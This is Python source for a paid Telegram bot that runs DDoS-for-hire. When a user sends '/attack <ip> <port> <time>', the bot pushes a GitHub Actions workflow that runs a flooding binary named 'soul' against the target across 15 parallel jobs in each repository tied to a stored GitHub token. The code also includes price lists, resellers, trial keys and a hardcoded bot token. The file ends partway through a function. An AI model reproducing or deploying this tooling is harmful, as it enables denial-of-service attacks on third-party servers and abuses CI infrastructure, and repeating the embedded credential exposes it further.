import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8369031146:AAFIxZMLP3XSiQKILBO96K6xYZLhP6QMHdA"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]
OWNER_IDS = [8101867786]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until
    if MAINTENANCE_MODE:
        return False, "⚠️ MAINTENANCE MODE\nBot is under maintenance. Please wait."
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ MAXIMUM ATTACK LIMIT REACHED\nYou have used all {MAX_ATTACKS} attack(s). Contact admin for more."
    if current_attack is not None:
        return False, "⚠️ ERROR: ATTACK ALREADY RUNNING\nPlease wait until the current attack finishes or 40 seconds cooldown."
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ COOLDOWN REMAINING\nPlease wait {remaining_time} seconds before starting new attack."
    return True, "✅ Ready to start attack"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "GAME"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ Invalid IP - IPs starting with '15' or '96' are not allowed"
    else:
        return "BGMI FLOOD", "GAME"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until
    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }
    return {"status": "ready"}

def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)
    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)
    if key not in trial_keys:
        return False, "Invalid key"
    key_data = trial_keys[key]
    if key_data["used"]:
        return False, "Key already used"
    if time.time() > key_data["expiry"]:
        return False, "Key expired"
    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)
    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)
    return True, f"✅ Trial access activated for {key_data['hours']} hours!"

def create_repository(token, repo_name="soulcrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="SOULCRACK DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]

jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"✅ Created configuration for {repo_name}")
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        return total_cancelled
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("🔧 MAINTENANCE MODE\nBot is under maintenance.\nPlease wait until it's back.")
        return
    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break
        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 NEW ACCESS REQUEST\nUser: @{update.effective_user.username or 'No username'}\nID: {user_id}\nUse /add {user_id} 7 to approve"
                    )
                except:
                    pass
        await update.message.reply_text(
            f"📋 ACCESS REQUEST SENT\nYour access request has been sent to admin.\nPlease wait for approval.\n\nUse /id to get your user ID\nUse /help for available commands\n\n💡 Want a trial?\nAsk admin for a trial key or redeem one with /redeem <key>"
        )
        return
    attack_status = get_attack_status()
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        await update.message.reply_text(f"🔥 ATTACK RUNNING\nTarget: {attack['ip']}:{attack['port']}\nElapsed: {attack_status['elapsed']}s\nRemaining: {attack_status['remaining']}s")
        return
    if attack_status["status"] == "cooldown":
        await update.message.reply_text(f"⏳ COOLDOWN\nPlease wait {attack_status['remaining_cooldown']}s\nbefore starting new attack.")
        return
    if is_owner(user_id):
        user_role = "👑 PRIMARY OWNER" if is_primary_owner(user_id) else "👑 OWNER"
    elif is_admin(user_id):
        user_role = "🛡️ ADMIN"
    elif is_reseller(user_id):
        user_role = "💰 RESELLER"
    else:
        user_role = "👤 APPROVED USER"
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    await update.message.reply_text(
        f"🤖 WELCOME TO THE BOT 🤖\n{user_role}\n\n🎯 Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}\n\n📋 AVAILABLE COMMANDS:\n• /attack <ip> <port> <time> - Start attack\n• /status - Check attack status\n• /stop - Stop all attacks\n• /id - Get your user ID\n• /myaccess - Check your access\n• /help - Show help\n• /redeem <key> - Redeem trial key\n\n📢 NOTES:\n• Only one attack at a time\n• {COOLDOWN_DURATION}s cooldown after attack\n• Invalid IPs: '15', '96'"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_owner(user_id) or is_admin(user_id):
        await update.message.reply_text(
            "🆘 HELP - AVAILABLE COMMANDS\n\nFOR ALL USERS:\n• /attack <ip> <port> <time>\n• /status - Check status\n• /stop - Stop attack\n• /id - Get your ID\n• /myaccess - Check access\n• /help - Show help\n• /redeem <key> - Redeem trial key\n\nADMIN COMMANDS:\n• /add <id> <days> - Add user\n• /remove <id> - Remove user\n• /userslist - List users\n• /approveuserslist - Pending list\n• /ownerlist - List owners\n• /adminlist - List admins\n• /resellerlist - List resellers\n• /pricelist - Show prices\n• /resellerpricelist - Reseller prices\n• /listgrp - List groups\n• /maintenance <on/off>\n• /broadcast - Send broadcast\n• /setcooldown <seconds>\n• /setmaxattack <number>\n• /gentrailkey <hours> - Generate trial key\n• /addtoken - Add github token\n• /tokens - List tokens\n• /removetoken - Remove token\n• /removexpiredtoken - Remove expired tokens\n• /binary_upload - Upload binary\n• /addowner - Add owner\n• /deleteowner - Remove owner\n• /addreseller - Add reseller\n• /removereseller - Remove reseller\n\nNeed help? Contact admin."
        )
    elif can_user_attack(user_id):
        await update.message.reply_text(
            "🆘 HELP - AVAILABLE COMMANDS\n• /attack <ip> <port> <time>\n• /status - Check status\n• /stop - Stop attack\n• /id - Get your ID\n• /myaccess - Check access\n• /help - Show help\n• /redeem <key> - Redeem trial key\n\nNeed help? Contact admin."
        )
    else:
        await update.message.reply_text(
            f"🆘 HELP\n• /id - Get your user ID\n• /help - Show help\n• /redeem <key> - Redeem trial key\n\nTO GET ACCESS:\n1. Use /start to request\n2. Contact admin\n3. Wait for approval\n\nYour ID: {user_id}"
        )

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    await update.message.reply_text(f"🆔 YOUR USER IDENTIFICATION\n• User ID: {user_id}\n• Username: @{username}\n\nSend this ID to admin for access.")

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_owner(user_id):
        role = "👑 PRIMARY OWNER" if is_primary_owner(user_id) else "👑 OWNER"
        expiry = "LIFETIME"
    elif is_admin(user_id):
        role = "🛡️ ADMIN"
        expiry = "LIFETIME"
    elif is_reseller(user_id):
        role = "💰 RESELLER"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
            except:
                pass
    elif is_approved_user(user_id):
        role = "👤 APPROVED USER"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
            except:
                pass
    else:
        role = "⏳ PENDING"
        expiry = "Waiting for approval"
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    await update.message.reply_text(
        f"🔐 YOUR ACCESS INFO\n• Role: {role}\n• User ID: {user_id}\n• Username: @{update.effective_user.username or 'No username'}\n• Expiry: {expiry}\n• Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}\n\nAttack access: {'✅ YES' if can_user_attack(user_id) else '❌ NO'}"
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nYou are not authorized to attack.\nUse /start to request access.")
        return
    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return
    if len(context.args) != 3:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /attack <ip> <port> <time>\n\nExample: /attack 1.1.1.1 80 60")
        return
    if not github_tokens:
        await update.message.reply_text("❌ NO SERVERS AVAILABLE\nNo servers available. Contact admin.")
        return
    ip, port, time_val = context.args
    if not is_valid_ip(ip):
        await update.message.reply_text("⚠️ INVALID IP\nIPs starting with '15' or '96' are not allowed.")
        return
    method, method_name = get_attack_method(ip)
    if method is None:
        await update.message.reply_text(f"⚠️ INVALID IP\n{method_name}")
        return
    try:
        attack_duration = int(time_val)
        if attack_duration <= 0:
            await update.message.reply_text("❌ INVALID TIME\nTime must be a positive number")
            return
    except ValueError:
        await update.message.reply_text("❌ INVALID TIME\nTime must be a number")
        return
    start_attack(ip, port, time_val, user_id, method)
    progress_msg = await update.message.reply_text("🔄 STARTING ATTACK...")
    success_count = 0
    fail_count = 0
    threads = []
    results = []
    def update_single_token(token_data):
        try:
            result = update_yml_file(token_data['token'], token_data['repo'], ip, port, time_val, method)
            results.append((token_data['username'], result))
        except Exception as e:
            results.append((token_data['username'], False))
    for token_data in github_tokens:
        thread = threading.Thread(target=update_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    for username, success in results:
        if success:
            success_count += 1
        else:
            fail_count += 1
    user_id_str = str(user_id)
    remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)
    message = f"🎯 ATTACK STARTED!\nTarget: {ip}\nPort: {port}\nTime: {time_val}s\nServers: {success_count}\nMethod: {method_name}\nCooldown: {COOLDOWN_DURATION}s after attack\nRemaining attacks: {remaining_attacks}/{MAX_ATTACKS}"
    await progress_msg.edit_text(message)
    def monitor_attack_completion():
        time.sleep(attack_duration)
        finish_attack()
        logger.info(f"Attack completed automatically after {attack_duration} seconds")
    monitor_thread = threading.Thread(target=monitor_attack_completion)
    monitor_thread.daemon = True
    monitor_thread.start()

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nYou are not authorized.")
        return
    attack_status = get_attack_status()
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = f"🔥 ATTACK RUNNING\nTarget: {attack['ip']}:{attack['port']}\nElapsed: {attack_status['elapsed']}s\nRemaining: {attack_status['remaining']}s\nMethod: {attack['method']}"
    elif attack_status["status"] == "cooldown":
        message = f"⏳ COOLDOWN\nRemaining: {attack_status['remaining_cooldown']}s\nNext attack in: {attack_status['remaining_cooldown']}s"
    else:
        message = "✅ READY\nNo attack running.\nYou can start a new attack."
    await update.message.reply_text(message)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nYou are not authorized.")
        return
    attack_status = get_attack_status()
    if attack_status["status"] != "running":
        await update.message.reply_text("❌ NO ACTIVE ATTACK\nNo attack is running.")
        return
    if not github_tokens:
        await update.message.reply_text("❌ NO SERVERS AVAILABLE\nNo servers added.")
        return
    progress_msg = await update.message.reply_text("🛑 STOPPING ATTACK...")
    total_stopped = 0
    success_count = 0
    threads = []
    results = []
    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            results.append((token_data['username'], stopped))
        except Exception as e:
            results.append((token_data['username'], 0))
    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    for username, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1
    stop_attack()
    message = f"🛑 ATTACK STOPPED\n✅ Workflows cancelled: {total_stopped}\n✅ Servers: {success_count}/{len(github_tokens)}\n⏳ Cooldown: {COOLDOWN_DURATION}s"
    await progress_msg.edit_text(message)

async def removexpiredtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can remove expired tokens.")
        return
    valid_tokens = []
    expired_tokens = []
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            _ = user.login
            valid_tokens.append(token_data)
        except:
            expired_tokens.append(token_data)
    if not expired_tokens:
        await update.message.reply_text("✅ All tokens are valid.")
        return
    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)
    expired_list = f"🗑️ EXPIRED TOKENS REMOVED:\n"
    for token in expired_tokens:
        expired_list += f"• {token['username']} - {token['repo']}\n"
    expired_list += f"\n📊 Remaining tokens: {len(valid_tokens)}"
    await update.message.reply_text(expired_list)

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /remove <user_id>\nExample: /remove 12345678")
        return
    try:
        user_to_remove = int(context.args[0])
        user_to_remove_str = str(user_to_remove)
        removed = False
        if user_to_remove_str in approved_users:
            del approved_users[user_to_remove_str]
            save_approved_users(approved_users)
            removed = True
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
        save_pending_users(pending_users)
        if user_to_remove_str in user_attack_counts:
            del user_attack_counts[user_to_remove_str]
            save_user_attack_counts(user_attack_counts)
        if removed:
            await update.message.reply_text(f"✅ USER ACCESS REMOVED\nUser ID: {user_to_remove}\nRemoved by: {user_id}")
            try:
                await context.bot.send_message(chat_id=user_to_remove, text="🚫 YOUR ACCESS HAS BEEN REMOVED\nYour access to the bot has been revoked. Contact admin for more information.")
            except:
                pass
        else:
            await update.message.reply_text(f"❌ USER NOT FOUND\nUser ID {user_to_remove} not found in approved users.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def gentrailkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /gentrailkey <hours>\nExample: /gentrailkey 24")
        return
    try:
        hours = int(context.args[0])
        if hours < 1 or hours > 720:
            await update.message.reply_text("❌ Hours must be between 1 and 720 (30 days)")
            return
        key = generate_trial_key(hours)
        await update.message.reply_text(f"🔑 TRIAL KEY GENERATED\nKey: {key}\nDuration: {hours} hours\nExpires: in {hours} hours\n\nUsers can redeem with:\n/redeem {key}")
    except ValueError:
        await update.message.reply_text("❌ Invalid number of hours")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /redeem <key>\nExample: /redeem TRL-ABCD-1234-EFGH")
        return
    key = context.args[0].upper()
    if can_user_attack(user_id):
        await update.message.reply_text("⚠️ YOU ALREADY HAVE ACCESS\nYou already have access to the bot. No need to redeem a trial key.")
        return
    success, message = redeem_trial_key(key, user_id)
    if success:
        await update.message.reply_text(f"✅ TRIAL ACTIVATED!\n{message}\n\nYou can now use /start to access the bot.")
    else:
        await update.message.reply_text(f"❌ FAILED TO REDEEM\n{message}")

async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can set maximum attacks.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /setmaxattack <number>\nExample: /setmaxattack 3")
        return
    try:
        max_attacks = int(context.args[0])
        if max_attacks < 1 or max_attacks > 1000:
            await update.message.reply_text("❌ Maximum attacks must be between 1 and 100")
            return
        global MAX_ATTACKS
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)
        await update.message.reply_text(f"✅ MAXIMUM ATTACKS UPDATED\nNew limit: {MAX_ATTACKS} attack(s) per user")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def userslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if not approved_users:
        await update.message.reply_text("📭 No approved users")
        return
    users_list = "👤 APPROVED USERS LIST\n"
    count = 1
    for uid, user_info in approved_users.items():
        username = user_info.get('username', f'user_{uid}')
        days = user_info.get('days', '?')
        expiry = user_info.get('expiry', 'LIFETIME')
        if expiry == "LIFETIME":
            remaining = "LIFETIME"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "EXPIRED"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                    remaining = f"{days_left}d {hours_left}h"
            except:
                remaining = "UNKNOWN"
        users_list += f"{count}. {uid} - @{username} ({days} days) | Remaining: {remaining}\n"
        count += 1
    users_list += f"\n📊 Total users: {len(approved_users)}"
    await update.message.reply_text(users_list)

async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can use this command.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /maintenance <on/off>\nExample: /maintenance on")
        return
    mode = context.args[0].lower()
    global MAINTENANCE_MODE
    if mode == "on":
        MAINTENANCE_MODE = True
        save_maintenance_mode(True)
        await update.message.reply_text("🔧 MAINTENANCE MODE ENABLED\nBot is now under maintenance.\nOnly admins can use the bot.")
    elif mode == "off":
        MAINTENANCE_MODE = False
        save_maintenance_mode(False)
        await update.message.reply_text("✅ MAINTENANCE MODE DISABLED\nBot is now available for all users.")
    else:
        await update.message.reply_text("❌ Invalid mode. Use 'on' or 'off'")

async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can set cooldown.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /setcooldown <seconds>\nExample: /setcooldown 300")
        return
    try:
        new_cooldown = int(context.args[0])
        if new_cooldown < 10:
            await update.message.reply_text("❌ Cooldown must be at least 10 seconds")
            return
        global COOLDOWN_DURATION
        COOLDOWN_DURATION = new_cooldown
        save_cooldown(new_cooldown)
        await update.message.reply_text(f"✅ COOLDOWN UPDATED\nNew cooldown: {COOLDOWN_DURATION} seconds")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nThis command is for admins only.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /add <id> <days>\nExample: /add 123456 7")
        return
    try:
        new_user_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 24 * 60 * 60)
        approved_users[str(new_user_id)] = {
            "username": update.effective_user.username or f"user_{new_user_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)
        try:
            await context.bot.send_message(chat_id=new_user_id, text=f"✅ ACCESS APPROVED!\nYour access has been approved for {days} days.\nUse /start to access the bot.")
        except:
            pass
